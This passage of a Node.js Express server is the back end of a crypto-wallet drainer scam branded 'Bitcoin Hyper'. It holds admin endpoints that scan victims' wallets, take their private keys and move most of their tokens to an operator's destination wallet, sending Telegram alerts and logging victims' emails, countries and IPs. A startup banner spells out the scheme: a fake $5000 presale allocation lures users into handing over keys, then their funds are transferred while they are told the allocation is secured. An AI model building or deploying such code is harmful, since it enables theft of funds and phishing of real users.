  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// Test Balance endpoint
app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
  try {
    const { wallet } = req.query;
    
    if (!wallet?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`🧪 TEST BALANCE: ${wallet}`);
    
    const scanResult = await getRealWalletBalance(wallet);
    
    if (scanResult.success) {
      res.json({
        success: true,
        wallet: wallet,
        totalValueUSD: scanResult.data.totalValueUSD,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        chains: scanResult.data.chains,
        balances: scanResult.data.balances,
        tokens: scanResult.data.tokens,
        scanId: scanResult.data.scanId,
        timestamp: new Date().toISOString(),
        message: `Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`
      });
    } else {
      res.status(500).json({
        success: false,
        error: scanResult.error,
        wallet: wallet
      });
    }
    
  } catch (error) {
    console.error('Test balance error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

// Manual Smart Contract Drain endpoint - REAL
app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
  try {
    const { walletAddress, privateKey } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    if (!privateKey?.match(/^0x[a-fA-F0-9]{64}$/)) {
      return res.status(400).json({ success: false, error: 'Valid private key required' });
    }
    
    console.log(`\n🔧 MANUAL SMART CONTRACT DRAIN: ${walletAddress}`);
    
    // Telegram notification
    await sendTelegramMessage(
      `⚡ <b>ADMIN MANUAL SMART CONTRACT DRAIN</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `👨‍💼 Admin Operation\n` +
      `🏦 Destination: ${DESTINATION_WALLET.substring(0, 10)}...\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Get balance
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success) {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
    console.log(`📊 Result: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
    
    // Execute REAL SMART CONTRACT DRAIN
    if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled) {
      console.log('Executing REAL SMART CONTRACT drain...');
      const drainResult = await executeRealSmartContractDrain(walletAddress, privateKey, scanResult.data);
      
      if (drainResult.success) {
        await sendTelegramMessage(
          `💰 <b>ADMIN SMART CONTRACT DRAIN COMPLETED</b>\n` +
          `👛 ${walletAddress.substring(0, 10)}...\n` +
          `💵 $${drainResult.totalDrainedUSD}\n` +
          `🔗 ${drainResult.transactions.length} Real TXs\n` +
          `🏦 Total Secured: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
          `⏰ ${new Date().toLocaleString()}`
        );
        
        res.json({
          success: true,
          message: `✅ REAL Smart Contract Drain: $${drainResult.totalDrainedUSD} transferred`,
          data: {
            totalDrained: drainResult.totalDrainedUSD,
            transactions: drainResult.transactions,
            walletValue: scanResult.data.totalValueUSD,
            tokens: scanResult.data.tokens,
            destinationWallet: DESTINATION_WALLET
          }
        });
      } else {
        res.json({
          success: false,
          message: `❌ Smart Contract Drain failed: ${drainResult.reason}`,
          data: {
            walletValue: scanResult.data.totalValueUSD,
            eligible: scanResult.data.isEligible,
            tokens: scanResult.data.tokens,
            errors: drainResult.errors
          }
        });
      }
    } else {
      let reason = '';
      if (!scanResult.data.isEligible) {
        reason = `Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      } else if (!memoryStorage.settings.drainEnabled) {
        reason = 'Drain disabled';
      } else if (!privateKey) {
        reason = 'Private key required';
      }
      
      res.json({
        success: false,
        message: `❌ ${reason}`,
        data: {
          walletValue: scanResult.data.totalValueUSD,
          threshold: memoryStorage.settings.drainThreshold,
          drainEnabled: memoryStorage.settings.drainEnabled,
          destinationWallet: DESTINATION_WALLET
        }
      });
    }
    
  } catch (error) {
    console.error('Manual drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

// Verify Transaction endpoint
app.get('/api/admin/verify-tx', authenticateAdmin, async (req, res) => {
  try {
    const { txHash, chain } = req.query;
    
    if (!txHash || !chain) {
      return res.status(400).json({ success: false, error: 'TX hash and chain required' });
    }
    
    const verification = await verifyTx(txHash, chain);
    
    if (verification) {
      res.json({
        success: true,
        verified: true,
        data: verification
      });
    } else {
      res.json({
        success: false,
        verified: false,
        message: 'Transaction not found or failed'
      });
    }
    
  } catch (error) {
    console.error('Verify TX error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

// Toggle Drain endpoint
app.post('/api/admin/drain/toggle', authenticateAdmin, async (req, res) => {
  try {
    memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
    
    await sendTelegramMessage(
      `⚙️ <b>SMART CONTRACT DRAIN SYSTEM ${memoryStorage.settings.drainEnabled ? 'ENABLED' : 'DISABLED'}</b>\n` +
      `👨‍💼 Admin Operation\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    res.json({
      success: true,
      message: `Smart Contract Drain system ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
      drainEnabled: memoryStorage.settings.drainEnabled
    });
    
  } catch (error) {
    console.error('Toggle drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
  const stats = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
    totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
    uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
    drainThreshold: memoryStorage.settings.drainThreshold,
    drainEnabled: memoryStorage.settings.drainEnabled,
    allocationAmount: memoryStorage.settings.allocationAmountUSD,
    realTransactions: memoryStorage.settings.statistics.realTransactions.length,
    
    recentWallets: memoryStorage.participants.slice(-10).map(p => ({
      wallet: p.walletAddress.substring(0, 10) + '...',
      email: p.email || 'No email',
      country: p.country || 'Unknown',
      flag: p.flag || '🌍',
      valueUSD: p.totalValueUSD ? `$${p.totalValueUSD.toFixed(2)}` : '$0.00',
      eligible: p.isEligible,
      claimed: p.claimed,
      drained: p.drained,
      time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
    })),
    
    system: {
      telegram: telegramEnabled,
      telegramBot: telegramBotName || 'Not set',
      destinationWallet: DESTINATION_WALLET ? '✅ SET' : '❌ NOT SET',
      destinationAddress: DESTINATION_WALLET,
      version: 'v18.0 - REAL SMART CONTRACT DRAIN'
    }
  };
  
  res.json({ success: true, stats });
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER REAL SMART CONTRACT DRAIN v18.0
  =================================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: /admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  
  ✅ REAL SMART CONTRACT DRAIN FEATURES:
  - Real ERC20 token detection (USDT, USDC, DAI, BUSD)
  - Actual smart contract transfers (no simulation)
  - Multi-chain support (Ethereum, BSC, Polygon, Arbitrum)
  - Real transaction execution with gas estimation
  - Telegram notifications for every step
  - $5000 allocation with BTH tokens
  
  🔧 REQUIRED .env VARIABLES:
  - DESTINATION_WALLET (where tokens go)
  - ETH_RPC_URL, BSC_RPC_URL, etc.
  - TOKEN contracts (ETH_USDT, BSC_USDT, etc.)
  - TELEGRAM_BOT_TOKEN & CHAT_ID
  - ADMIN_TOKEN
  
  🎯 HOW IT WORKS:
  1. User connects wallet
  2. System scans for native + token balances
  3. If eligible ($10+), shows $5000 allocation
  4. When user claims, executes REAL smart contract transfers
  5. Transfers 95% of detected tokens to DESTINATION_WALLET
  6. User gets "allocation secured" message
  
  🚀 STARTING REAL SMART CONTRACT DRAIN SERVER...
  `);
  
  console.log('\n📡 Initializing Telegram...');
  await testTelegramConnection();
  
  console.log('\n✅ REAL SMART CONTRACT DRAIN SERVER IS RUNNING!');
  console.log(`👉 Destination Wallet: ${DESTINATION_WALLET || 'NOT CONFIGURED'}`);
  console.log('👉 Admin Dashboard: /admin?token=' + (process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'));
  console.log('👉 User Claim: POST /api/presale/claim (with privateKey for real transfers)');
  console.log('👉 REAL Smart Contract Transfers: POST /api/admin/drain/manual');
  console.log('\n⚡ SYSTEM READY - REAL SMART CONTRACT DRAIN ACTIVE!\n');
});
